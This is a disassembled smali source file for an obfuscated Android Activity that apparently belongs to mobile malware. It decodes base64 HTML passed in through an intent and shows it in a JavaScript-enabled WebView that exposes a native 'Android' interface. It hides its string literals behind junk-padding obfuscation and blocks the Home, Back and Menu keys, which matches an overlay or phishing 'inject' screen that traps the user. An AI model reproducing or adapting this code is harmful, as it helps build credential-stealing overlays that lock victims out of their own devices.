.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;
.super Landroid/app/Activity;
.source "majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$WebAppInterface;,
        Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$MyWebViewClient;,
        Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$MyWebChromeClient;
    }
.end annotation


# instance fields
.field T2:Ljava/lang/String;

.field willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 23
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const-string v0, ""

    .line 24
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method protected onCreate(Landroid/os/Bundle;)V
    .locals 10

    const-string v0, "maxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55"

    .line 28
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 30
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->getIntent()Landroid/content/Intent;

    move-result-object p1

    const/4 v1, 0x0

    const/4 v2, 0x1

    :try_start_0
    const-string v3, "key"

    .line 33
    invoke-virtual {p1, v3}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 100
    :try_start_1
    new-instance v9, Landroid/webkit/WebView;

    invoke-direct {v9, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    .line 101
    invoke-virtual {v9}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v3

    invoke-virtual {v3, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    .line 102
    invoke-virtual {v9, v1}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    .line 103
    new-instance v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$MyWebViewClient;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$MyWebViewClient;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$1;)V

    invoke-virtual {v9, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 104
    new-instance v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$MyWebChromeClient;

    invoke-direct {v2, p0, v3}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$MyWebChromeClient;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$1;)V

    invoke-virtual {v9, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 105
    new-instance v2, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$WebAppInterface;

    invoke-direct {v2, p0, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25$WebAppInterface;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;Landroid/content/Context;)V

    const-string v3, "Andrmaxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55oid"

    invoke-static {v3, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->cegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v9, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    .line 108
    new-instance v5, Ljava/lang/String;

    invoke-static {p1, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object p1

    const-string v1, "UTF-8"

    invoke-direct {v5, p1, v1}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    const/4 v4, 0x0

    const-string p1, "text/htmaxicxtrdtrgcyrzxlkccalqskintcmgocbjhhktxiqrrtfgmlatskejzshvrjkouibqqhvgqrztqyhntdkgdddaqintlfwvlzhgkfgwtgvmjjuvgllqkcyvbtlsllgbxygoowjajnqjmvedzsoqtzybtxorvcsglibwxmgrwidwcmyaxhzmptzwqofnxfyfgtmlizqdybiymfehykwmeftvjvwefisuxihmqhswbmwfytcbnuzcdiszlcsfojijrzfomfhohlsvezmdzbynjivcnbkhvmxmoragarjxawhchnikgkerwsqgnqeebqvijcgiadxjjcybwznlnlzbtmnurtmqzgnqnibdslixngyjyfrbddgbooclnmtbvwhsngkcgfjjziilskzo55ml"

    .line 111
    invoke-static {p1, v0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->cegyolerywkhbglhweubkrtxyjobspzxdnujqwrzohudexlqal53(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    const-string v7, "UTF-8"

    const/4 v8, 0x0

    move-object v3, v9

    invoke-virtual/range {v3 .. v8}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 112
    invoke-virtual {p0, v9}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->setContentView(Landroid/view/View;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    :catch_0
    return-void

    .line 35
    :catch_1
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    .line 36
    :goto_0
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    const-string v3, "ask_battary"

    if-eqz p1, :cond_1

    .line 38
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 39
    invoke-virtual {v0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_0

    .line 41
    iput-object v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 42
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_0

    .line 48
    :cond_0
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_0

    .line 51
    :cond_1
    :goto_1
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_3

    .line 53
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 54
    invoke-virtual {v0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_2

    .line 56
    iput-object v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 57
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_1

    .line 63
    :cond_2
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_1

    .line 66
    :cond_3
    :goto_2
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_5

    .line 68
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 69
    invoke-virtual {v0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_4

    .line 71
    iput-object v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 72
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_2

    .line 78
    :cond_4
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_2

    .line 81
    :cond_5
    :goto_3
    iget-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_7

    .line 83
    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 84
    invoke-virtual {v0, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_6

    .line 86
    iput-object v3, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->T2:Ljava/lang/String;

    .line 87
    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_3

    .line 93
    :cond_6
    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    iput-object p1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/majtfiybehuxyrqlajjnbjfythkkpmzatktzlbytqnzemyczsi25;->willvskbtgnvdztflbmglmbxuthvnttjuqabiectnzvxmpqloapbvb212:Ljava/lang/Boolean;

    goto :goto_3

    :cond_7
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 122
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 v0, 0x4

    if-ne p1, v0, :cond_1

    goto :goto_0

    :cond_1
    const/16 v0, 0x52

    if-ne p1, v0, :cond_2

    goto :goto_0

    :cond_2
    const/4 p2, 0x0

    :goto_0
    return p2
.end method

.method protected onStop()V
    .locals 0

    .line 130
    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
